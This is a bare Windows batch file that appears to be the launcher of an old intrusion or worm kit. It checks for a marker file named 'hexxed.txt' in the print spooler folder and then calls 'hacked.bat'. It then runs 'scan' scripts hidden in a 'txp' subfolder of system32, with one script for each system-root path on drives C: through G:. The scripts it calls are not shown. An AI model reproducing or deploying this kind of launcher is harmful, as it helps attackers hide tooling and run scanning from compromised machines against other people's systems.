@echo off
IF EXIST %systemroot%\system32\spool\printers\hexxed.txt CALL hacked.bat
IF %systemroot%==C:\WINNT CALL C:\winnt\system32\txp\scannt2k.bat 
IF %systemroot%==C:\WINDOWS CALL C:\windows\system32\txp\scanxp.bat 
IF %systemroot%==D:\WINNT CALL D:\winnt\system32\txp\scannt2kd.bat
IF %systemroot%==D:\WINDOWS CALL D:\windows\txp\scanxpd.bat
IF %systemroot%==E:\WINNT CALL E:\winnt\system32\txp\scannt2ke.bat
IF %systemroot%==E:\WINDOWS CALL E:\windows\system32\txp\scanxpe.bat
IF %systemroot%==F:\WINNT CALL F:\winnt\system32\txp\scannt2kf.bat
IF %systemroot%==F:\WINDOWS CALL F:\windows\system32\txp\scanxpf.bat
IF %systemroot%==G:\WINNT CALL G:\winnt\system32\txp\scannt2kg.bat
IF %systemroot%==G:\WINDOWS CALL G:\windows\system32\txp\scanxpg.bat


